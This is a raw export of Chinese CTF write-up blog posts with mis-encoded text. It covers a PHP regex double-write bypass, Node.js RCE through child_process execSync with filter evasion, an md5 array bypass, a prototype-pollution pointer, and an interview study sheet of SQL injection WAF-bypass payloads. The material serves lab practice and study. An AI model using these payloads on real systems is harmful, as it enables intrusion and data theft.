href="https://blog.csdn.net/qq_42939527/article/details/105201926">„ÄêWUST-CTF2020„Äëgirlfriend</a><br>‰ΩøÁî®Â∑•ÂÖ∑<strong>dtmf2num_2</strong>ÂæóÂà∞ÊåâÈîÆÂè∑Á†Å<br><img src="https://img-blog.csdnimg.cn/5c1938e626414009aa94897eee698429.png" alt="3"><br>ÊãøÂà∞flag„ÄÇ<strong>aupCTF{00923456060484}</strong></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      <categories>
          
          <category> Ëµõ‰∫ãWP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Africa battle CTF 2023</title>
      <link href="/2023/06/24/Africa-battle-CTF-2023/"/>
      <url>/2023/06/24/Africa-battle-CTF-2023/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="ÂâçË®Ä"><a href="#ÂâçË®Ä" class="headerlink" title="ÂâçË®Ä"></a>ÂâçË®Ä</h2><p>ËøôÂá†Â§©ÂõΩÂÜÖÊ≤°Êúâ‰ªÄ‰πàÊØîËµõÔºåÁúã‰∏Ä‰∏ãÂõΩÂ§ñÁöÑÊØîËµõÂêß<br><img src="https://img1.imgtp.com/2023/06/24/1vay1LoH.png" alt="1"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><p>‰∏ÄÂºÄÂßãÂÅöwebÈ¢òÁöÑÊó∂ÂÄôÁéØÂ¢É‰∏ÄÁõ¥Êâì‰∏çÂºÄÔºåÊàëËøò‰ª•‰∏∫ÊòØÈÇ£ËæπÁöÑÈóÆÈ¢òÔºåÁªìÊûú‰∏ãÂçàÊç¢‰∫ÜÊú∫Âú∫ÂèàËÉΩËÆøÈóÆ‰∫Ü„ÄÇ</p><h3 id="Civilization"><a href="#Civilization" class="headerlink" title="Civilization"></a>Civilization</h3><p>ÊâìÂºÄÁΩëÁ´ôÂêéÁúãÂà∞Ëøô‰∏™<br><img src="https://img-blog.csdnimg.cn/1197576aa444402bbeccc85df9ccafcd.png" alt="2"><br>ÊâìÂºÄÁΩëÁ´ôÂêéÁúãÂà∞Ëøô‰∏™<br>‰º†ÂÖ•sourceÂêéÊòæÁ§∫Ê∫êÁ†ÅÔºö</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">require</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"./flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ami'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$input</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ami'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$cigar</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'africacradlecivilization'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/<span class="token interpolation"><span class="token variable">$cigar</span></span>/"</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$input</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$cigar</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">africa</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"home.html"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>okÔºåÂ§ßÊ¶ÇÊÑèÊÄùÂ∞±ÊòØÂú®‰º†ÂÖ•sourceÂêé‰ºöÊòæÁ§∫Ê∫êÁ†ÅÔºå‰πãÂêéÂ¶ÇÊûúÂÜç‰º†ÂÖ•amiÁöÑËØùÔºåÂÜçËøõË°å‰∏Ä‰∏™Ê≠£ÂàôÂåπÈÖçÊÑèÊÄùÂ∞±ÊòØÂ∞Ü<strong>cigar</strong>ÁöÑÂÄº<strong>africacradlecivilization</strong>Âà†Èô§ÂêéÂ¶ÇÊûúËøòÁ≠â‰∫é<strong>cigar</strong>ÈÇ£Â∞±ËøõË°å‰∏ã‰∏ÄÊ≠•ÔºåÈÇ£‰πàÂèØ‰ª•ÊÉ≥Âà∞ÂèåÂÜôËøõË°åÁªïËøá„ÄÇ‰º†ÂÖ•<code>?source=&amp;ami=africacrafricacradlecivilizationadlecivilization</code>Âç≥ÂèØÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/f267e5a536424c08971111a00c024839.png" alt="2"></p><h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="Thumb"><a href="#Thumb" class="headerlink" title="Thumb"></a>Thumb</h3><p><img src="https://img-blog.csdnimg.cn/0f847f4b10fe4d4bb16ec186df53b093.png" alt="3"></p><p>ËøôÈÅìÈ¢ò‰∏ãËΩΩ‰πãÂêéÂ∞±ÊòØ‰∏ÄÂº†ÂõæÁâáÊü•ÁúãÁöÑÊó∂ÂÄôÂèòÊàê‰∫Ü‰∫åÁª¥Á†Å„ÄÇ<img src="https://img-blog.csdnimg.cn/edbed056a8ce45bbbcd0895bd8a43ce5.jpeg" alt="3"><br><img src="https://img-blog.csdnimg.cn/98b35979c0f1473c99e3d22abc891009.png" alt="5"><br>ÂæÆ‰ø°Êâ´‰∏ÄÊâ´Âç≥Âá∫flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/3f6b41a7f97f4c14a519c2f49c53fc3a.png" alt="6"></p><h3 id="Find-Me"><a href="#Find-Me" class="headerlink" title="Find Me"></a>Find Me</h3><p>ÊòØ‰∏ÄÈÅìÊµÅÈáèÂàÜÊûêÈ¢ò<br><img src="https://img-blog.csdnimg.cn/fc1e3addbbd644998d2bc407ce192e81.png" alt="7"><br>ËøáÊª§httpÂåÖ<br><img src="https://img-blog.csdnimg.cn/75c6715314054dfa82d12a4cc6b877f5.png" alt="1"><br>Ë¥¶Êà∑ÂØÜÁ†Å‰∏ÄËà¨ÊòØPOSTÊñπÂºè‰º†ÂÖ•ÔºåÊü•ÁúãÂà∞ÂØÜÁ†ÅÂØÜÊñáÔºåÂ∞±ÊòØÁÆÄÂçïÁöÑbase46Âä†ÂØÜ„ÄÇËß£Á†Å‰πãÂêéÂæóÂà∞ÊòéÊñáÂØÜÁ†Å<br><img src="https://img-blog.csdnimg.cn/db80329811b0440991c50c78e908797c.png" alt="1"><br>ÊúÄÂêéflag‰∏∫<code>battleCTF&#123;PApdsjRTae&#125;</code></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="Back-To-Origin"><a href="#Back-To-Origin" class="headerlink" title="Back To Origin"></a>Back To Origin</h3><p><img src="https://img-blog.csdnimg.cn/ac05d62cc039487b89ae19d4e08314fe.png" alt="1">Âè§ÂüÉÂèäË±°ÂΩ¢ÊñáÂ≠ó<br><a href="https://www.likefont.com/">ËØÜÂà´Â≠ó‰ΩìÁΩëÁ´ô</a></p>]]></content>
      
      
      <categories>
          
          <category> Ëµõ‰∫ãWP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-nodejs</title>
      <link href="/2023/06/23/ctfshoow-nodejs/"/>
      <url>/2023/06/23/ctfshoow-nodejs/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="335"><a href="#335" class="headerlink" title="335"></a>335</h2><p>‰∏ÄÈÅìrceÈ¢òÁõÆ<br><strong>require(‚Äòchild_process‚Äô).execSync(‚Äòls‚Äô);</strong></p><h2 id="336"><a href="#336" class="headerlink" title="336"></a>336</h2><p>ÂèëÁé∞Ë¢´ËøáÊª§‰∫Ü‰∏úË•øÔºå<br><code>?eval=__filename</code>:ÊâìÂç∞Âá∫ÂΩì‰∏ãÊñá‰ª∂Ë∑ØÂæÑ„ÄÇ<br><code>?eval=__dirname</code>:ÊâìÂç∞Âá∫ÂΩì‰∏ãÊâÄÂú®Êñá‰ª∂Â§πË∑ØÂæÑ„ÄÇ<br><img src="https://img-blog.csdnimg.cn/e9bed0e011fc43859dc646488a80f9bd.png" alt="1"><br>ÁÑ∂ÂêéËØªÂèñÊñá‰ª∂<code>?eval=require(&#39;fs&#39;).readFileSync(&#39;/app/routes/index.js&#39;,&#39;utf-8&#39;)</code><br><img src="https://img-blog.csdnimg.cn/28c279fff781455bbb9b44b2c0556449.png" alt="2"><br>Ë¢´ËøáÊª§‰∫ÜÔºåÁªïËøáËøáÊª§„ÄÇ<br><code>?eval=require(&#39;child_process&#39;)[&#39;exe&#39;+&#39;cSync&#39;](&#39;ls&#39;);</code>ÂÜçËøõË°åurlÁºñÁ†Å‰∏Ä‰∏ã„ÄÇ<br><img src="https://img-blog.csdnimg.cn/d5576132fdeb4f0786bfb052d3b942c6.png" alt="3">ÂëΩ‰ª§ÊâßË°åÂç≥ÂèØÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/e59fe23388254d009bdd149868b776ec.png" alt="4"></p><p>ËØªÂèñÊñá‰ª∂ÂæóÂà∞flag‰πüË°å„ÄÇ</p><h2 id="337"><a href="#337" class="headerlink" title="337"></a>337</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token parameter">s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> crypto<span class="token punctuation">.</span><span class="token function">createHash</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">/* GET home page. */</span>router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'xxxxxxx'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> a <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>a<span class="token punctuation">;</span>  <span class="token keyword">var</span> b <span class="token operator">=</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>b<span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>a <span class="token operator">&amp;&amp;</span> b <span class="token operator">&amp;&amp;</span> a<span class="token punctuation">.</span>length<span class="token operator">===</span>b<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> a<span class="token operator">!==</span>b <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span>a<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span>b<span class="token operator">+</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'tql'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÁÆÄÂçïÁöÑÊï∞ÁªÑÁªïËøá<code>?a[]=1&amp;b[]=1</code>Âç≥ÂèØÂæóÂà∞flag„ÄÇ<br><img src="https://img-blog.csdnimg.cn/03ad667c580b4a9d96f30777554c3985.png" alt="3"></p><h2 id="338"><a href="#338" class="headerlink" title="338"></a>338</h2><p>‰∏ãËΩΩÁªôÁöÑÊ∫êÁ†ÅÔºåÊâæÂà∞login.jsÊñá‰ª∂„ÄÇ</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> router <span class="token operator">=</span> express<span class="token punctuation">.</span><span class="token function">Router</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> utils <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'../utils/common'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/* GET home page.  */</span>router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag<span class="token operator">=</span><span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> secert <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> sess <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">;</span>  <span class="token keyword">let</span> user <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  utils<span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span>req<span class="token punctuation">.</span>body<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>secert<span class="token punctuation">.</span>ctfshow<span class="token operator">===</span><span class="token string">'36dboy'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//***ÂÖ≥ÈîÆÁÇπ</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">ret_code</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token literal-property property">ret_msg</span><span class="token operator">:</span> <span class="token string">'ÁôªÂΩïÂ§±Ë¥•'</span><span class="token operator">+</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> router<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÂéüÂûãÈìæÊ±°Êüì<a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__">Â≠¶‰π†ÊñáÁ´†</a><br><img src="https://img-blog.csdnimg.cn/04baaf7cddac488a88409bfd74e1f5b4.png" alt="5"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hvvÂàùÁ∫ßÈù¢ËØïÊÄªÁªì</title>
      <link href="/2023/06/20/hvv%E5%88%9D%E7%BA%A7%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/"/>
      <url>/2023/06/20/hvv%E5%88%9D%E7%BA%A7%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="OWASP-Top10ÊúâÂì™‰∫õÊºèÊ¥û"><a href="#OWASP-Top10ÊúâÂì™‰∫õÊºèÊ¥û" class="headerlink" title="OWASP Top10ÊúâÂì™‰∫õÊºèÊ¥û"></a>OWASP Top10ÊúâÂì™‰∫õÊºèÊ¥û</h2><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">SQL</span>Ê≥®ÂÖ•Â§±ÊïàÁöÑË∫´‰ªΩËÆ§ËØÅÊïèÊÑüÊï∞ÊçÆÊ≥ÑÈú≤<span class="token constant">XML</span>Â§ñÈÉ®ÂÆû‰ΩìÔºà<span class="token constant">XXE</span>ÔºâÂ§±ÊïàÁöÑËÆøÈóÆÊéßÂà∂ÂÆâÂÖ®ÈÖçÁΩÆÈîôËØØË∑®Á´ôËÑöÊú¨Ôºà<span class="token constant">XSS</span>Ôºâ‰∏çÂÆâÂÖ®ÁöÑÂèçÂ∫èÂàóÂåñ‰ΩøÁî®Âê´ÊúâÂ∑≤Áü•ÊºèÊ¥ûÁöÑÁªÑ‰ª∂‰∏çË∂≥ÁöÑÊó•ÂøóËÆ∞ÂΩïÂíåÁõëÊéß<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Â∏∏ËßÅÊï∞ÊçÆÂ∫ìÈªòËÆ§Á´ØÂè£"><a href="#Â∏∏ËßÅÊï∞ÊçÆÂ∫ìÈªòËÆ§Á´ØÂè£" class="headerlink" title="Â∏∏ËßÅÊï∞ÊçÆÂ∫ìÈªòËÆ§Á´ØÂè£"></a>Â∏∏ËßÅÊï∞ÊçÆÂ∫ìÈªòËÆ§Á´ØÂè£</h2><p>MySqlÔºö3306</p><p>OracleÔºö1521</p><p>RedisÔºö6379</p><p>MssqlÔºö1433    &#x2F;&#x2F;ÂÖ®Áß∞ÔºöMicrosoft SQL Server</p><p>PostgreSQLÔºö5432</p><p><strong>‰ΩÜÂú®ÂÆûÈôÖ‰ΩøÁî®‰∏≠ÂèØËÉΩ‰ºöÊ†πÊçÆÈúÄË¶ÅËøõË°å‰øÆÊîπ</strong></p><h2 id="SQLÊ≥®ÂÖ•ÁöÑÊµÅÈáèÂàÜÊûê"><a href="#SQLÊ≥®ÂÖ•ÁöÑÊµÅÈáèÂàÜÊûê" class="headerlink" title="SQLÊ≥®ÂÖ•ÁöÑÊµÅÈáèÂàÜÊûê"></a>SQLÊ≥®ÂÖ•ÁöÑÊµÅÈáèÂàÜÊûê</h2><p>ÈÄöËøáÊó•ÂøóÊü•ÁúãÊîªÂáªËÄÖËæìÂÖ•ÁöÑÂ≠óÊÆµ„ÄÇ‰∏ÄËà¨Âú®Áî®Êà∑ÂØÜÁ†ÅÁôªÂΩïÊó∂ÊîªÂáªËÄÖ‰ºöÊ≥®ÂÖ•ÊÅ∂ÊÑèSQLËØ≠Âè•ÔºåÂ¶ÇÊûúÁΩëÁ´ô‰∏çÂØπÁî®Êà∑ËæìÂÖ•ÁöÑÂÜÖÂÆπ ËøõË°åÈôêÂà∂ÔºåÊûÅÊòìÂá∫Áé∞ÂØπÁΩëÁ´ôÁöÑÁ†¥Âùè„ÄÇ</p><p>union ,select Ôºåsleep Á≠âÊïèÊÑüÂ≠óÁ¨¶„ÄÇ</p><h2 id="Â∏∏ËßÅSQLÊ≥®ÂÖ•ÁªïËøá"><a href="#Â∏∏ËßÅSQLÊ≥®ÂÖ•ÁªïËøá" class="headerlink" title="Â∏∏ËßÅSQLÊ≥®ÂÖ•ÁªïËøá"></a>Â∏∏ËßÅSQLÊ≥®ÂÖ•ÁªïËøá</h2><p><strong>SQLÊ≥®ÂÖ•Â§ßÂ∞èÂÜôÁªïËøáÔºö</strong></p><p>ÈÄöËøáÂ∞ÜËØ≠Âè•Â§ßÂ∞èÂÜôÊõ¥ÊîπÔºåËøõË°åÁªïËøá„ÄÇÔºàËøôÁßçÊÉÖÂÜµÈÄöÂ∏∏Âá∫Áé∞Âú®WAFÂØπÊâìÂ∞èÂÜôÊ≤°ÊúâËøáÊª§ÁöÑÊÉÖÂÜµ‰∏ãÔºâ</p><pre class="line-numbers language-none"><code class="language-none">UniOn AND 1 &#x3D; 2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQLÊ≥®ÂÖ•Ê≥®ÈáäÁ¨¶ÁªïËøá:</strong></p><p>ÈÄöËøáÊ∑ªÂä†Ê≥®ÈáäÁ¨¶ÂØπËØ≠Âè•ÂÜÖÂÆπËøõË°åÁªï</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;*ÁªïËøáÁöÑÂÜÖÂÆπ*&#x2F;select user,password from &#x2F;**&#x2F;users<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQLÊ≥®ÂÖ•Á©∫Ê†ºÁªïËøá</strong></p><p>ÈÄöËøáÊ∑ªÂä†Á©∫Ê†ºÁöÑURLÁºñÁ†ÅËøõÂÖ•ÁªïËøá</p><pre class="line-numbers language-none"><code class="language-none">Á©∫Ê†ºÁöÑURLÁºñÁ†Å%20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQLÊ≥®ÂÖ•ÂºïÂè∑ÁªïËøá</strong></p><p>‰ΩøÁî®Âà∞ÂºïÂè∑ÁöÑÂú∞Êñπ‰∏ÄËà¨Âú®ËØ≠Âè•‰∏≠ÔºåÂÉèwhereËØ≠Âè•ÔºåËøôÊù°ËØ≠Âè•ÊÑèËØÜÂ∞±ÊòØÁî®Êù•Êü•ÂæóÂà∞usersË°®‰∏≠ÊâÄÊúâÂ≠óÊÆµ</p><pre class="line-numbers language-none"><code class="language-none">select column_name from information_schema.tables where table_name&#x3D;&quot;users&quot;select column_name from information_schema.tables where table_name&#x3D;&quot;text&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQLÊ≥®ÂÖ•ÂçÅÂÖ≠ËøõÂà∂ÁªïËøá</strong></p><p>ÂΩìÂºïÂè∑ÁªïËøáÊñπÊ≥ïË¢´ËøáÊª§ÁöÑÊÉÖÂÜµ‰∏ãÔºåËøòÂèØ‰ª•Âà©Áî®ËøõÂà∂ËøõË°åÁªïËøá„ÄÇ</p><pre class="line-numbers language-none"><code class="language-none">Â∞ÜusersËΩ¨Êç¢‰∏∫ÂçÅÂÖ≠ËøõÂà∂ËøõË°åÁªïËøáselect column_name from information_schema.tables where table_name&#x3D;0x7573657273<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQLÊ≥®ÂÖ•from forËØ≠Âè•ÁªïËøá</strong></p><p>ÂΩìËøõË°åSQLÁõ≤Ê≥®‰ºöÁî®Âà∞Ôºå<code>substr()</code> ,<code>mid()</code> ,<code>limit</code>„ÄÇËøô‰∫õÂè•Â≠êÊñπÊ≥ïÈÉΩÈúÄË¶ÅÁî®Âà∞ÈÄóÂè∑„ÄÇÂØπ‰∫é<code>substr()</code> ,<code>mid()</code> Âè•Â≠êÂèØ‰ª•Áõ¥Êé•Âà©Áî®from forÂè•Â≠êËøõË°åÁªïËøá„ÄÇ</p><pre class="line-numbers language-none"><code class="language-none">ÂçïÂºïÂè∑ÁªïËøáÔºå‰∏éfrom forÁªïËøá select substr(database() from 1 for 1)&#x3D;&#39;tyaq&#39;; select mid(database() from 1 for 1)&#x3D;&#39;tyaq&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQLÊ≥®ÂÖ•ÊØîËæÉÁ¨¶ÁªïËøá&lt;&gt;</strong></p><p>sqlÁõ≤Ê≥®,‰ΩøÁî®‰∫åÂàÜÊü•ÊâæÊó∂ÈúÄË¶Å‰ΩøÁî®Âà∞ÊØîËæÉÁ¨¶Êù•ËøõË°å„ÄÇ</p><pre class="line-numbers language-none"><code class="language-none">select * from users where id&#x3D;1 and ascii(substr(database(),0,1))&gt;88<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQLÊ≥®ÂÖ•greatestÁªïËøá</strong></p><p>ÂΩìÊØîËæÉÁ¨¶Ë¢´Á≥ªÁªüËøáÊª§‰∫ÜÔºåÊØîËæÉÁ¨¶Áõ≤Ê≥®ËØ≠Âè•Êó†Ê≥ï‰ΩøÁî®Êó∂ÔºåÂèØ‰ª•‰ΩøÁî®greatestÊù•‰ª£ÊõøÊØîËæÉÊìç‰ΩúÁ¨¶„ÄÇ<code>greatest(n1,n2,n3,n4Á≠â)</code>ÂáΩÊï∞ËøîÂõûËæìÂÖ•ÂèÇÊï∞<code>(n1,n2,n3,n4Á≠â)</code>ÁöÑÊúÄÂ§ßÂÄº„ÄÇ</p><p>sqlËØ≠Âè•ÂèØ‰ª•‰ΩøÁî®greatestÂèò‰∏∫asciiÁ†ÅÂÄºËøõË°åÂ§ßÂ∞èÁàÜÁ†¥</p><pre class="line-numbers language-none"><code class="language-none">select * from cms_users where userid&#x3D;1 and greatest(ascii(substr(database(),1,1)),1)&#x3D;88;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQLÊ≥®ÂÖ•ÁºñÁ†ÅÁªïËøá</strong></p><p>URLEncodeÁºñÁ†ÅÔºåASCII,HEX,unicodeÁºñÁ†ÅÁªïËøáÔºö</p><pre class="line-numbers language-none"><code class="language-none">ASCIIÁ†ÅÁªïËøáTest Á≠â‰ª∑‰∫éCHAR(55)+CHAR(66)+CHAR(88)+CHAR(99)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ÂØπÂÖ≥ÈîÆÂ≠óËøõË°åURLÁºñÁ†ÅÁªïËøá</p><pre class="line-numbers language-none"><code class="language-none">URLÁºñÁ†ÅËΩ¨Êç¢ÁªïËøá1+and+1&#x3D;11+%25%36%31%25%36%65%25%36%34+1&#x3D;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>16ËøõÂà∂ÁºñÁ†ÅËΩ¨Êç¢ÁªïËøá</p><pre class="line-numbers language-none"><code class="language-none">Â∞ÜusersËΩ¨Êç¢‰∏∫ÂçÅÂÖ≠ËøõÂà∂ËøõË°åÁªïËøáselect column_name from information_schema.tables where table_name&#x3D;users;select column_name from information_schema.tables where table_name&#x3D;0x7573657273;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SQLÊ≥®ÂÖ•ÂÜÖËÅîÊ≥®ÈáäÁªïËøá</strong></p><pre class="line-numbers language-none"><code 